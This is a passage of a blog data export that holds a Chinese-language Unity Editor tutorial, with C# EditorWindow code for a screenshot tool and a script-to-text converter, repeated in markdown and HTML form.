typeof(TextAsset), true);\n            EditorGUILayout.LabelField(\"被保存在    \" + saveFilePath + \"/\" + \"    路径下面\");\n            //绘制Text字段，用户获取用户指定的路径\n            if (GUILayout.Button(\"选择txt保存的路径\"))\n            {\n                saveFilePath = EditorUtility.SaveFolderPanel(\"Path to Save Images\", saveFilePath, Application.dataPath);\n            }\n            if (GUILayout.Button(\"script保存为txt\"))\n            {\n                //执行这个方法\n                SaveFile(\".txt\");\n            }\n            if (textAssetObject!=null && !textAssetObject.text.Equals(\"\"))\n            {\n                scriptsContext = textAssetObject.text;\n            }\n        }\n        GUILayout.Space(40);\n        {\n\n            scriptAssetObject = (TextAsset)EditorGUILayout.ObjectField(\"txt转script\", scriptAssetObject, typeof(TextAsset), true);\n            EditorGUILayout.LabelField(\"被保存在    \" + saveFilePath + \"/\" + \"    路径下面\");\n            //绘制Text字段，用户获取用户指定的路径\n            if (GUILayout.Button(\"选择脚本保存的路径\"))\n            {\n                saveFilePath = EditorUtility.SaveFolderPanel(\"Path to Save Images\", saveFilePath, Application.dataPath);\n            }\n            if (GUILayout.Button(\"txt保存为script\"))\n            {\n                //执行这个方法\n                SaveFile(\".cs\");\n            }\n            if (scriptAssetObject != null && !scriptAssetObject.text.Equals(\"\"))\n            {\n                scriptsContext = textAssetObject.text;\n            }\n        }\n        GUILayout.Space(40);\n        {\n            Texture2D texture2D = AssetDatabase.LoadAssetAtPath(\"Assets/Texture/Battleground_bg.png\", typeof(Texture2D)) as Texture2D;\n            GUI.DrawTexture(GUILayoutUtility.GetRect(500, 300), texture2D);\n        }\n        GUILayout.EndVertical();\n    }\n\n    //默认文件保存路径\n    private const string defaultFilePath = \"Assets/TextFiles/\";\n\n    //默认脚本保存路径\n    private const string defaultScriptPath = \"Assets/Scripts/\";\n\n    /// <summary>\n    /// 脚本转换为文本\n    /// </summary>\n    void SaveFile(string suffix)\n    {\n        string path = defaultFilePath;\n        if (!saveFilePath.Equals(\"\"))\n        {\n            path = saveFilePath;\n        }\n        if (!Directory.Exists(path))\n        {\n            Directory.CreateDirectory(path);\n        }\n        //写入文件\n        StreamWriter sw = new StreamWriter(defaultFilePath + textAssetObject.name + suffix);\n        sw.Write(textAssetObject.text);\n        sw.Close();\n        AssetDatabase.Refresh();\n    }\n\n}\n\n```","source":"_posts/Unity/UnityEditor/10 Screenshot.md","raw":"---\ntitle: 10 Screenshot\ndate: 2020-05-11 11:41:32\ntop: 10\ncategories:\n- Unity\ntags:\n- UnityEditor\n---\n# 使用Editor编写一个截屏得window面板\n\n* 1:先理解一些手机概念的定义.[手机参数概念](http://www.woshipm.com/ucd/198774.html)\n手机5.2英寸的定义是:手机的对角线是5.2英寸,1英寸（inch）=2.54厘米（cm）,计算方式就是勾股定理,算斜边的长度就是卖手机的时候所说的手机尺寸.\n手机分辨率是1920PX*1080PX:PX的意思就是像素,可以默认为像素是分辨率,手机的点,线,面都是由一个个的像素表现的,可以理解为一个像素是一个小网格,这个含义表示,在手机的竖向上面有1920个像素,在手机的横向上面有1080个像素.\n屏幕像素密度:即在一个对角线长度为1英寸的正方形内所拥有的像素数\n* 2:如果需要查看camera/px/size/unit 摄像机,摄像机的size,像素,单位,x,y,width,height的区别,百度一下.[RenderTexture概念1](https://docs.unity3d.com/ScriptReference/RenderTexture.html),[RenderTexture概念2](https://blog.csdn.net/leonwei/article/details/54972653),[RenderTexture概念3](https://www.jianshu.com/p/334770f39127)\n* 3:\n```\nusing System.Collections;\nusing System.Collections.Generic;\nusing UnityEngine;\nusing UnityEditor;\n\npublic class ScreenshotWindow : EditorWindow\n{\n    int resWidth  = Screen.width * 4;\n    int resHeight = Screen.height * 4;\n\n    public Camera currentCamera;\n\n    int scale = 1;\n\n    string path = \"\";\n\n    bool showPreview = true;\n\n    RenderTexture renderTexture;\n\n    bool isTransparent = false;\n\n    float lastTime;\n\n    string lastPath;\n\n\n    [MenuItem(\"Tools/截屏\")]\n    public static void ShowScreenshotWindow()\n    {\n        EditorWindow ew = GetWindow<ScreenshotWindow>();\n        ew.autoRepaintOnSceneChange = true;//窗口发生变化时,自动重绘\n        ew.titleContent = new GUIContent(\"截屏\");\n    }\n\n\n    private void OnGUI()\n    {\n        {\n            EditorGUILayout.LabelField(\"分辨率\", EditorStyles.boldLabel);\n            resWidth = EditorGUILayout.IntField(\"截取宽度:\", resWidth);\n            resHeight = EditorGUILayout.IntField(\"截取高度:\", resHeight);\n            EditorGUILayout.Space();\n            scale = EditorGUILayout.IntSlider(\"缩放\", scale, 1, 15);\n            //显示帮助信息\n            EditorGUILayout.HelpBox(\"截屏的默认模式是裁剪-所以选择一个合适的宽度和高度。比例是一个因素，以倍增或扩大渲染而不失去质量。\", MessageType.None);\n            EditorGUILayout.Space();\n        }\n\n        {\n            GUILayout.Label(\"Save Path\", EditorStyles.boldLabel);\n\n            EditorGUILayout.BeginHorizontal();\n            EditorGUILayout.TextField(path, GUILayout.MaxWidth(500));\n            if (GUILayout.Button(\"选择文件\"))\n            {\n                path = EditorUtility.SaveFolderPanel(\"Path to Save Images\", path, Application.dataPath);\n            }\n            EditorGUILayout.EndHorizontal();\n            //显示帮助信息\n            EditorGUILayout.HelpBox(\"选择文件夹保存截取的图片\", MessageType.None);\n            EditorGUILayout.Space();\n        }\n        {\n            GUILayout.Label(\"Select Camera\", EditorStyles.boldLabel);\n            currentCamera = EditorGUILayout.ObjectField(\"选择摄像机\", currentCamera, typeof(Camera), true) as Camera;\n            if (currentCamera==null)\n            {\n                currentCamera = Camera.main;\n            }\n            isTransparent = EditorGUILayout.Toggle(\"是否需要透明背景\", isTransparent);\n            EditorGUILayout.HelpBox(\"选择要捕捉渲染的摄像机,可以使用透明选项使背景透明.\", MessageType.None);\n            EditorGUILayout.Space();\n        }\n        {\n            EditorGUILayout.BeginHorizontal();\n            if (GUILayout.Button(\"当前屏幕分辨率\"))\n            {\n                resWidth = (int)Handles.GetMainGameViewSize().x;\n                resHeight = (int)Handles.GetMainGameViewSize().y;\n            }\n\n            if (GUILayout.Button(\"默认屏幕分辨率\"))\n            {\n                resHeight = 1440;\n                resWidth = 2560;\n                scale = 1;\n            }\n\n            EditorGUILayout.EndHorizontal();\n            EditorGUILayout.LabelField(\"截图将于 \" + resWidth * scale + \" x \" + resHeight * scale + \" 像素拍摄\", EditorStyles.boldLabel);\n            EditorGUILayout.Space();\n        }\n        {\n            if (GUILayout.Button(\"截屏\",GUILayout.MinHeight(40)))\n            {\n                TakeScreenshot();\n            }\n            EditorGUILayout.BeginHorizontal();\n            if (GUILayout.Button(\"Open Last Screenshot\", GUILayout.MaxWidth(160), GUILayout.MinHeight(40)))\n            {\n                if (lastPath != \"\")\n                {\n                    Application.OpenURL(\"file://\" + lastPath);\n                }\n            }\n            if (GUILayout.Button(\"Open Folder\", GUILayout.MaxWidth(100), GUILayout.MinHeight(40)))\n            {\n\n                Application.OpenURL(\"file://\" + path);\n            }\n            if (GUILayout.Button(\"More Assets\", GUILayout.MaxWidth(100), GUILayout.MinHeight(40)))\n            {\n                Application.OpenURL(\"https://www.assetstore.unity3d.com/en/#!/publisher/5951\");\n            }\n            EditorGUILayout.EndHorizontal();\n        }\n\n    }\n\n    private void TakeScreenshot()\n    {\n        int resWidthN = resWidth * scale;\n        int resHeightN = resHeight * scale;\n        RenderTexture rt = new RenderTexture(resWidth, resHeight, 24);\n        currentCamera.targetTexture = rt;\n        TextureFormat tf = TextureFormat.RGB24;\n        if (isTransparent)\n        {\n            tf = TextureFormat.RGBA32;\n        }\n        Texture2D screenShot = new Texture2D(resWidthN, resHeightN, tf, false);\n        currentCamera.Render();//将屏幕渲染到targetTexture里面\n        RenderTexture.active = rt;//当前活跃的RenderTexture\n        //将GPU中的FrameBufferObject可读对象拷贝到CPU中存储为一个buffer,然后读取到Texture2D中\n        screenShot.ReadPixels(new Rect(0, 0, resWidthN, resHeightN), 0, 0);\n        currentCamera.targetTexture = null;\n        RenderTexture.active = null;\n        byte[] bytes = screenShot.EncodeToPNG();//编码成PNG\n        lastPath = string.Format(\"{0}/screen_{1}x{2}_{3}.png\", path, resWidthN, resHeightN, System.DateTime.Now.ToString(\"yyyy-mm-dd_HH-mm-ss\"));\n        System.IO.File.WriteAllBytes(lastPath, bytes);\n        Application.OpenURL(lastPath);//打开图片\n        AssetDatabase.Refresh(); \n    }\n\n\n}\n\n```\n* 4:\n```\nusing System.Collections;\nusing System.Collections.Generic;\nusing UnityEngine;\nusing UnityEditor;\nusing System.IO;\n\npublic class ScriptToText : EditorWindow\n{\n    [MenuItem(\"Tools/脚本与文件互转\")]\n    static void ShowScriptToTextWindow()\n    {\n        GetWindow<ScriptToText>(\"脚本与文件互转\");\n    }\n\n\n\n\n    private void OnGUI()\n    {\n        //整个窗口为水平布局\n        GUILayout.BeginHorizontal();\n        DrawLeft();\n        //GUILayout.Label(\"|\", GUILayout.MinHeight(10000));\n        DrawRight();\n        GUILayout.EndHorizontal();\n    }\n\n    private string scriptsContext = \"\";\n    private Vector2 scrollposition;\n\n    /// <summary>\n    /// 绘制左边的区域\n    /// </summary>\n    private void DrawLeft()\n    {\n        //局部为垂直窗口区域\n        GUILayout.BeginVertical();\n        GUILayout.Label(\"显示脚本中的所有内容:\");\n        //开始滑动的区域\n        scrollposition = GUILayout.BeginScrollView(scrollposition);\n\n        //绘制文本\n        scriptsContext = GUILayout.TextArea(scriptsContext, GUILayout.ExpandHeight(true));//动态高度,会占满\n\n        GUILayout.EndScrollView();\n        GUILayout.EndVertical();\n    }\n\n    //文件资源对象\n    TextAsset textAssetObject;\n    //脚本资源对象\n    TextAsset scriptAssetObject;\n\n    //文件保存的路径\n    string saveFilePath = \"\";\n    //脚本保存的路径\n    string scriptFilePath = \"\";\n\n    //绘制2D图像\n    Texture2D texture2D;\n\n    private void DrawRight()\n    {\n        //局部为垂直窗口区域\n        GUILayout.BeginVertical();\n        {\n\n            textAssetObject = (TextAsset)EditorGUILayout.ObjectField(\"script转txt\", textAssetObject, typeof(TextAsset), true);\n            EditorGUILayout.LabelField(\"被保存在    \" + saveFilePath + \"/\" + \"    路径下面\");\n            //绘制Text字段，用户获取用户指定的路径\n            if (GUILayout.Button(\"选择txt保存的路径\"))\n            {\n                saveFilePath = EditorUtility.SaveFolderPanel(\"Path to Save Images\", saveFilePath, Application.dataPath);\n            }\n            if (GUILayout.Button(\"script保存为txt\"))\n            {\n                //执行这个方法\n                SaveFile(\".txt\");\n            }\n            if (textAssetObject!=null && !textAssetObject.text.Equals(\"\"))\n            {\n                scriptsContext = textAssetObject.text;\n            }\n        }\n        GUILayout.Space(40);\n        {\n\n            scriptAssetObject = (TextAsset)EditorGUILayout.ObjectField(\"txt转script\", scriptAssetObject, typeof(TextAsset), true);\n            EditorGUILayout.LabelField(\"被保存在    \" + saveFilePath + \"/\" + \"    路径下面\");\n            //绘制Text字段，用户获取用户指定的路径\n            if (GUILayout.Button(\"选择脚本保存的路径\"))\n            {\n                saveFilePath = EditorUtility.SaveFolderPanel(\"Path to Save Images\", saveFilePath, Application.dataPath);\n            }\n            if (GUILayout.Button(\"txt保存为script\"))\n            {\n                //执行这个方法\n                SaveFile(\".cs\");\n            }\n            if (scriptAssetObject != null && !scriptAssetObject.text.Equals(\"\"))\n            {\n                scriptsContext = textAssetObject.text;\n            }\n        }\n        GUILayout.Space(40);\n        {\n            Texture2D texture2D = AssetDatabase.LoadAssetAtPath(\"Assets/Texture/Battleground_bg.png\", typeof(Texture2D)) as Texture2D;\n            GUI.DrawTexture(GUILayoutUtility.GetRect(500, 300), texture2D);\n        }\n        GUILayout.EndVertical();\n    }\n\n    //默认文件保存路径\n    private const string defaultFilePath = \"Assets/TextFiles/\";\n\n    //默认脚本保存路径\n    private const string defaultScriptPath = \"Assets/Scripts/\";\n\n    /// <summary>\n    /// 脚本转换为文本\n    /// </summary>\n    void SaveFile(string suffix)\n    {\n        string path = defaultFilePath;\n        if (!saveFilePath.Equals(\"\"))\n        {\n            path = saveFilePath;\n        }\n        if (!Directory.Exists(path))\n        {\n            Directory.CreateDirectory(path);\n        }\n        //写入文件\n        StreamWriter sw = new StreamWriter(defaultFilePath + textAssetObject.name + suffix);\n        sw.Write(textAssetObject.text);\n        sw.Close();\n        AssetDatabase.Refresh();\n    }\n\n}\n\n```","slug":"Unity/UnityEditor/10 Screenshot","published":1,"updated":"2020-05-15T02:50:36.251Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0o004t2gk70jmw6po2","content":"<h1 id=\"使用Editor编写一个截屏得window面板\"><a href=\"#使用Editor编写一个截屏得window面板\" class=\"headerlink\" title=\"使用Editor编写一个截屏得window面板\"></a>使用Editor编写一个截屏得window面板</h1><ul>\n<li>1:先理解一些手机概念的定义.<a href=\"http://www.woshipm.com/ucd/198774.html\" target=\"_blank\" rel=\"noopener\">手机参数概念</a><br>手机5.2英寸的定义是:手机的对角线是5.2英寸,1英寸（inch）=2.54厘米（cm）,计算方式就是勾股定理,算斜边的长度就是卖手机的时候所说的手机尺寸.<br>手机分辨率是1920PX*1080PX:PX的意思就是像素,可以默认为像素是分辨率,手机的点,线,面都是由一个个的像素表现的,可以理解为一个像素是一个小网格,这个含义表示,在手机的竖向上面有1920个像素,在手机的横向上面有1080个像素.<br>屏幕像素密度:即在一个对角线长度为1英寸的正方形内所拥有的像素数</li>\n<li>2:如果需要查看camera/px/size/unit 摄像机,摄像机的size,像素,单位,x,y,width,height的区别,百度一下.<a href=\"https://docs.unity3d.com/ScriptReference/RenderTexture.html\" target=\"_blank\" rel=\"noopener\">RenderTexture概念1</a>,<a href=\"https://blog.csdn.net/leonwei/article/details/54972653\" target=\"_blank\" rel=\"noopener\">RenderTexture概念2</a>,<a href=\"https://www.jianshu.com/p/334770f39127\" target=\"_blank\" rel=\"noopener\">RenderTexture概念3</a></li>\n<li>3:<pre><code>using System.Collections;\nusing System.Collections.Generic;\nusing UnityEngine;\nusing UnityEditor;\n</code></pre></li>\n</ul>\n<p>public class ScreenshotWindow : EditorWindow<br>{<br>    int resWidth  = Screen.width * 4;<br>    int resHeight = Screen.height * 4;</p>\n<pre><code>public Camera currentCamera;\n\nint scale = 1;\n\nstring path = &quot;&quot;;\n\nbool showPreview = true;\n\nRenderTexture renderTexture;\n\nbool isTransparent = false;\n\nfloat lastTime;\n\nstring lastPath;\n\n\n[MenuItem(&quot;Tools/截屏&quot;)]\npublic static void ShowScreenshotWindow()\n{\n    EditorWindow ew = GetWindow&lt;ScreenshotWindow&gt;();\n    ew.autoRepaintOnSceneChange = true;//窗口发生变化时,自动重绘\n    ew.titleContent = new GUIContent(&quot;截屏&quot;);\n}\n\n\nprivate void OnGUI()\n{\n    {\n        EditorGUILayout.LabelField(&quot;分辨率&quot;, EditorStyles.boldLabel);\n        resWidth = EditorGUILayout.IntField(&quot;截取宽度:&quot;, resWidth);\n        resHeight = EditorGUILayout.IntField(&quot;截取高度:&quot;, resHeight);\n        EditorGUILayout.Space();\n        scale = EditorGUILayout.IntSlider(&quot;缩放&quot;, scale, 1, 15);\n        //显示帮助信息\n        EditorGUILayout.HelpBox(&quot;截屏的默认模式是裁剪-所以选择一个合适的宽度和高度。比例是一个因素，以倍增或扩大渲染而不失去质量。&quot;, MessageType.None);\n        EditorGUILayout.Space();\n    }\n\n    {\n        GUILayout.Label(&quot;Save Path&quot;, EditorStyles.boldLabel);\n\n        EditorGUILayout.BeginHorizontal();\n        EditorGUILayout.TextField(path, GUILayout.MaxWidth(500));\n        if (GUILayout.Button(&quot;选择文件&quot;))\n        {\n            path = EditorUtility.SaveFolderPanel(&quot;Path to Save Images&quot;, path, Application.dataPath);\n        }\n        EditorGUILayout.EndHorizontal();\n        //显示帮助信息\n        EditorGUILayout.HelpBox(&quot;选择文件夹保存截取的图片&quot;, MessageType.None);\n        EditorGUILayout.Space();\n    }\n    {\n        GUILayout.Label(&quot;Select Camera&quot;, EditorStyles.boldLabel);\n        currentCamera = EditorGUILayout.ObjectField(&quot;选择摄像机&quot;, currentCamera, typeof(Camera), true) as Camera;\n        if (currentCamera==null)\n        {\n            currentCamera = Camera.main;\n        }\n        isTransparent = EditorGUILayout.Toggle(&quot;是否需要透明背景&quot;, isTransparent);\n        EditorGUILayout.HelpBox(&quot;选择要捕捉渲染的摄像机,可以使用透明选项使背景透明.&quot;, MessageType.None);\n        EditorGUILayout.Space();\n    }\n    {\n        EditorGUILayout.BeginHorizontal();\n        if (GUILayout.Button(&quot;当前屏幕分辨率&quot;))\n        {\n            resWidth = (int)Handles.GetMainGameViewSize().x;\n            resHeight = (int)Handles.GetMainGameViewSize().y;\n        }\n\n        if (GUILayout.Button(&quot;默认屏幕分辨率&quot;))\n        {\n            resHeight = 1440;\n            resWidth = 2560;\n            scale = 1;\n        }\n\n        EditorGUILayout.EndHorizontal();\n        EditorGUILayout.LabelField(&quot;截图将于 &quot; + resWidth * scale + &quot; x &quot; + resHeight * scale + &quot; 像素拍摄&quot;, EditorStyles.boldLabel);\n        EditorGUILayout.Space();\n    }\n    {\n        if (GUILayout.Button(&quot;截屏&quot;,GUILayout.MinHeight(40)))\n        {\n            TakeScreenshot();\n        }\n        EditorGUILayout.BeginHorizontal();\n        if (GUILayout.Button(&quot;Open Last Screenshot&quot;, GUILayout.MaxWidth(160), GUILayout.MinHeight(40)))\n        {\n            if (lastPath != &quot;&quot;)\n            {\n                Application.OpenURL(&quot;file://&quot; + lastPath);\n            }\n        }\n        if (GUILayout.Button(&quot;Open Folder&quot;, GUILayout.MaxWidth(100), GUILayout.MinHeight(40)))\n        {\n\n            Application.OpenURL(&quot;file://&quot; + path);\n        }\n        if (GUILayout.Button(&quot;More Assets&quot;, GUILayout.MaxWidth(100), GUILayout.MinHeight(40)))\n        {\n            Application.OpenURL(&quot;https://www.assetstore.unity3d.com/en/#!/publisher/5951&quot;);\n        }\n        EditorGUILayout.EndHorizontal();\n    }\n\n}\n\nprivate void TakeScreenshot()\n{\n    int resWidthN = resWidth * scale;\n    int resHeightN = resHeight * scale;\n    RenderTexture rt = new RenderTexture(resWidth, resHeight, 24);\n    currentCamera.targetTexture = rt;\n    TextureFormat tf = TextureFormat.RGB24;\n    if (isTransparent)\n    {\n        tf = TextureFormat.RGBA32;\n    }\n    Texture2D screenShot = new Texture2D(resWidthN, resHeightN, tf, false);\n    currentCamera.Render();//将屏幕渲染到targetTexture里面\n    RenderTexture.active = rt;//当前活跃的RenderTexture\n    //将GPU中的FrameBufferObject可读对象拷贝到CPU中存储为一个buffer,然后读取到Texture2D中\n    screenShot.ReadPixels(new Rect(0, 0, resWidthN, resHeightN), 0, 0);\n    currentCamera.targetTexture = null;\n    RenderTexture.active = null;\n    byte[] bytes = screenShot.EncodeToPNG();//编码成PNG\n    lastPath = string.Format(&quot;{0}/screen_{1}x{2}_{3}.png&quot;, path, resWidthN, resHeightN, System.DateTime.Now.ToString(&quot;yyyy-mm-dd_HH-mm-ss&quot;));\n    System.IO.File.WriteAllBytes(lastPath, bytes);\n    Application.OpenURL(lastPath);//打开图片\n    AssetDatabase.Refresh(); \n}</code></pre><p>}</p>\n<pre><code>* 4:</code></pre><p>using System.Collections;<br>using System.Collections.Generic;<br>using UnityEngine;<br>using UnityEditor;<br>using System.IO;</p>\n<p>public class ScriptToText : EditorWindow<br>{<br>    [MenuItem(“Tools/脚本与文件互转”)]<br>    static void ShowScriptToTextWindow()<br>    {<br>        GetWindow<ScriptToText>(“脚本与文件互转”);<br>    }</ScriptToText></p>\n<pre><code>private void OnGUI()\n{\n    //整个窗口为水平布局\n    GUILayout.BeginHorizontal();\n    DrawLeft();\n    //GUILayout.Label(&quot;|&quot;, GUILayout.MinHeight(10000));\n    DrawRight();\n    GUILayout.EndHorizontal();\n}\n\nprivate string scriptsContext = &quot;&quot;;\nprivate Vector2 scrollposition;\n\n/// &lt;summary&gt;\n/// 绘制左边的区域\n/// &lt;/summary&gt;\nprivate void DrawLeft()\n{\n    //局部为垂直窗口区域\n    GUILayout.BeginVertical();\n    GUILayout.Label(&quot;显示脚本中的所有内容:&quot;);\n    //开始滑动的区域\n    scrollposition = GUILayout.BeginScrollView(scrollposition);\n\n    //绘制文本\n    scriptsContext = GUILayout.TextArea(scriptsContext, GUILayout.ExpandHeight(true));//动态高度,会占满\n\n    GUILayout.EndScrollView();\n    GUILayout.EndVertical();\n}\n\n//文件资源对象\nTextAsset textAssetObject;\n//脚本资源对象\nTextAsset scriptAssetObject;\n\n//文件保存的路径\nstring saveFilePath = &quot;&quot;;\n//脚本保存的路径\nstring scriptFilePath = &quot;&quot;;\n\n//绘制2D图像\nTexture2D texture2D;\n\nprivate void DrawRight()\n{\n    //局部为垂直窗口区域\n    GUILayout.BeginVertical();\n    {\n\n        textAssetObject = (TextAsset)EditorGUILayout.ObjectField(&quot;script转txt&quot;, textAssetObject, typeof(TextAsset), true);\n        EditorGUILayout.LabelField(&quot;被保存在    &quot; + saveFilePath + &quot;/&quot; + &quot;    路径下面&quot;);\n        //绘制Text字段，用户获取用户指定的路径\n        if (GUILayout.Button(&quot;选择txt保存的路径&quot;))\n        {\n            saveFilePath = EditorUtility.SaveFolderPanel(&quot;Path to Save Images&quot;, saveFilePath, Application.dataPath);\n        }\n        if (GUILayout.Button(&quot;script保存为txt&quot;))\n        {\n            //执行这个方法\n            SaveFile(&quot;.txt&quot;);\n        }\n        if (textAssetObject!=null &amp;&amp; !textAssetObject.text.Equals(&quot;&quot;))\n        {\n            scriptsContext = textAssetObject.text;\n        }\n    }\n    GUILayout.Space(40);\n    {\n\n        scriptAssetObject = (TextAsset)EditorGUILayout.ObjectField(&quot;txt转script&quot;, scriptAssetObject, typeof(TextAsset), true);\n        EditorGUILayout.LabelField(&quot;被保存在    &quot; + saveFilePath + &quot;/&quot; + &quot;    路径下面&quot;);\n        //绘制Text字段，用户获取用户指定的路径\n        if (GUILayout.Button(&quot;选择脚本保存的路径&quot;))\n        {\n            saveFilePath = EditorUtility.SaveFolderPanel(&quot;Path to Save Images&quot;, saveFilePath, Application.dataPath);\n        }\n        if (GUILayout.Button(&quot;txt保存为script&quot;))\n        {\n            //执行这个方法\n            SaveFile(&quot;.cs&quot;);\n        }\n        if (scriptAssetObject != null &amp;&amp; !scriptAssetObject.text.Equals(&quot;&quot;))\n        {\n            scriptsContext = textAssetObject.text;\n        }\n    }\n    GUILayout.Space(40);\n    {\n        Texture2D texture2D = AssetDatabase.LoadAssetAtPath(&quot;Assets/Texture/Battleground_bg.png&quot;, typeof(Texture2D)) as Texture2D;\n        GUI.DrawTexture(GUILayoutUtility.GetRect(500, 300), texture2D);\n    }\n    GUILayout.EndVertical();\n}\n\n//默认文件保存路径\nprivate const string defaultFilePath = &quot;Assets/TextFiles/&quot;;\n\n//默认脚本保存路径\nprivate const string defaultScriptPath = &quot;Assets/Scripts/&quot;;\n\n/// &lt;summary&gt;\n/// 脚本转换为文本\n/// &lt;/summary&gt;\nvoid SaveFile(string suffix)\n{\n    string path = defaultFilePath;\n    if (!saveFilePath.Equals(&quot;&quot;))\n    {\n        path = saveFilePath;\n    }\n    if (!Directory.Exists(path))\n    {\n        Directory.CreateDirectory(path);\n    }\n    //写入文件\n    StreamWriter sw = new StreamWriter(defaultFilePath + textAssetObject.name + suffix);\n    sw.Write(textAssetObject.text);\n    sw.Close();\n    AssetDatabase.Refresh();\n}</code></pre><p>}</p>\n<p>```</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"使用Editor编写一个截屏得window面板\"><a href=\"#使用Editor编写一个截屏得window面板\" class=\"headerlink\" title=\"使用Editor编写一个截屏得window面板\"></a>使用Editor编写一个截屏得window面板</h1><ul>\n<li>1:先理解一些手机概念的定义.<a href=\"http://www.woshipm.com/ucd/198774.html\" target=\"_blank\" rel=\"noopener\">手机参数概念</a><br>手机5.2英寸的定义是:手机的对角线是5.2英寸,1英寸（inch）=2.54厘米（cm）,计算方式就是勾股定理,算斜边的长度就是卖手机的时候所说的手机尺寸.<br>手机分辨率是1920PX*1080PX:PX的意思就是像素,可以默认为像素是分辨率,手机的点,线,面都是由一个个的像素表现的,可以理解为一个像素是一个小网格,这个含义表示,在手机的竖向上面有1920个像素,在手机的横向上面有1080个像素.<br>屏幕像素密度:即在一个对角线长度为1英寸的正方形内所拥有的像素数</li>\n<li>2:如果需要查看camera/px/size/unit 摄像机,摄像机的size,像素,单位,x,y,width,height的区别,百度一下.<a href=\"https://docs.unity3d.com/ScriptReference/RenderTexture.html\" target=\"_blank\" rel=\"noopener\">RenderTexture概念1</a>,<a href=\"https://blog.csdn.net/leonwei/article/details/54972653\" target=\"_blank\" rel=\"noopener\">RenderTexture概念2</a>,<a href=\"https://www.jianshu.com/p/334770f39127\" target=\"_blank\" rel=\"noopener\">RenderTexture概念3</a></li>\n<li>3:<pre><code>using System.Collections;\nusing System.Collections.Generic;\nusing UnityEngine;\nusing UnityEditor;\n</code></pre></li>\n</ul>\n<p>public class ScreenshotWindow : EditorWindow<br>{<br>    int resWidth  = Screen.width * 4;<br>    int resHeight = Screen.height * 4;</p>\n<pre><code>public Camera currentCamera;\n\nint scale = 1;\n\nstring path = &quot;&quot;;\n\nbool showPreview = true;\n\nRenderTexture renderTexture;\n\nbool isTransparent = false;\n\nfloat lastTime;\n\nstring lastPath;\n\n\n[MenuItem(&quot;Tools/截屏&quot;)]\npublic static void ShowScreenshotWindow()\n{\n    EditorWindow ew = GetWindow&lt;ScreenshotWindow&gt;();\n    ew.autoRepaintOnSceneChange = true;//窗口发生变化时,自动重绘\n    ew.titleContent = new GUIContent(&quot;截屏&quot;);\n}\n\n\nprivate void OnGUI()\n{\n    {\n        EditorGUILayout.LabelField(&quot;分辨率&quot;, EditorStyles.boldLabel);\n        resWidth = EditorGUILayout.IntField(&quot;截取宽度:&quot;, resWidth);\n        resHeight = EditorGUILayout.IntField(&quot;截取高度:&quot;, resHeight);\n        EditorGUILayout.Space();\n        scale = EditorGUILayout.IntSlider(&quot;缩放&quot;, scale, 1, 15);\n        //显示帮助信息\n        EditorGUILayout.HelpBox(&quot;截屏的默认模式是裁剪-所以选择一个合适的宽度和高度。比例是一个因素，以倍增或扩大渲染而不失去质量。&quot;, MessageType.None);\n        EditorGUILayout.Space();\n    }\n\n    {\n        GUILayout.Label(&quot;Save Path&quot;, EditorStyles.boldLabel);\n\n        EditorGUILayout.BeginHorizontal();\n        EditorGUILayout.TextField(path, GUILayout.MaxWidth(500));\n        if (GUILayout.Button(&quot;选择文件&quot;))\n        {\n            path = EditorUtility.SaveFolderPanel(&quot;Path to Save Images&quot;, path, Application.dataPath);\n        }\n        EditorGUILayout.EndHorizontal();\n        //显示帮助信息\n        EditorGUILayout.HelpBox(&quot;选择文件夹保存截取的图片&quot;, MessageType.None);\n        EditorGUILayout.Space();\n    }\n    {\n        GUILayout.Label(&quot;Select Camera&quot;, EditorStyles.boldLabel);\n        currentCamera = EditorGUILayout.ObjectField(&quot;选择摄像机&quot;, currentCamera, typeof(Camera), true) as Camera;\n        if (currentCamera==null)\n        {\n            currentCamera = Camera.main;\n        }\n        isTransparent = EditorGUILayout.Toggle(&quot;是否需要透明背景&quot;, isTransparent);\n        EditorGUILayout.HelpBox(&quot;选择要捕捉渲染的摄像机,可以使用透明选项使背景透明.&quot;, MessageType.None);\n        EditorGUILayout.Space();\n    }\n    {\n        EditorGUILayout.BeginHorizontal();\n        if (GUILayout.Button(&quot;当前屏幕分辨率&quot;))\n        {\n            resWidth = (int)Handles.GetMainGameViewSize().x;\n            resHeight = (int)Handles.GetMainGameViewSize().y;\n        }\n\n        if (GUILayout.Button(&quot;默认屏幕分辨率&quot;))\n        {\n            resHeight = 1440;\n            resWidth = 2560;\n            scale = 1;\n        }\n\n        EditorGUILayout.EndHorizontal();\n        EditorGUILayout.LabelField(&quot;截图将于 &quot; + resWidth * scale + &quot; x &quot; + resHeight * scale + &quot; 像素拍摄&quot;, EditorStyles.boldLabel);\n        EditorGUILayout.Space();\n    }\n    {\n        if (GUILayout.Button(&quot;截屏&quot;,GUILayout.MinHeight(40)))\n        {\n            TakeScreenshot();\n        }\n        EditorGUILayout.BeginHorizontal();\n        if (GUILayout.Button(&quot;Open Last Screenshot&quot;, GUILayout.MaxWidth(160), GUILayout.MinHeight(40)))\n        {\n            if (lastPath != &quot;&quot;)\n            {\n                Application.OpenURL(&quot;file://&quot; + lastPath);\n            }\n        }\n        if (GUILayout.Button(&quot;Open Folder&quot;, GUILayout.MaxWidth(100), GUILayout.MinHeight(40)))\n        {\n\n            Application.OpenURL(&quot;file://&quot; + path);\n        }\n        if (GUILayout.Button(&quot;More Assets&quot;, GUILayout.MaxWidth(100), GUILayout.MinHeight(40)))\n        {\n            Application.OpenURL(&quot;https://www.assetstore.unity3d.com/en/#!/publisher/5951&quot;);\n        }\n        EditorGUILayout.EndHorizontal();\n    }\n\n}\n\nprivate void TakeScreenshot()\n{\n    int resWidthN = resWidth * scale;\n    int resHeightN = resHeight * scale;\n    RenderTexture rt = new RenderTexture(resWidth, resHeight, 24);\n    currentCamera.targetTexture = rt;\n    TextureFormat tf = TextureFormat.RGB24;\n    if (isTransparent)\n    {\n        tf = TextureFormat.RGBA32;\n    }\n    Texture2D screenShot = new Texture2D(resWidthN, resHeightN, tf, false);\n    currentCamera.Render();//将屏幕渲染到targetTexture里面\n    RenderTexture.active = rt;//当前活跃的RenderTexture\n    //将GPU中的FrameBufferObject可读对象拷贝到CPU中存储为一个buffer,然后读取到Texture2D中\n    screenShot.ReadPixels(new Rect(0, 0, resWidthN, resHeightN), 0, 0);\n    currentCamera.targetTexture = null;\n    RenderTexture.active = null;\n    byte[] bytes = screenShot.EncodeToPNG();//编码成PNG\n    lastPath = string.Format(&quot;{0}/screen_{1}x{2}_{3}.png&quot;, path, 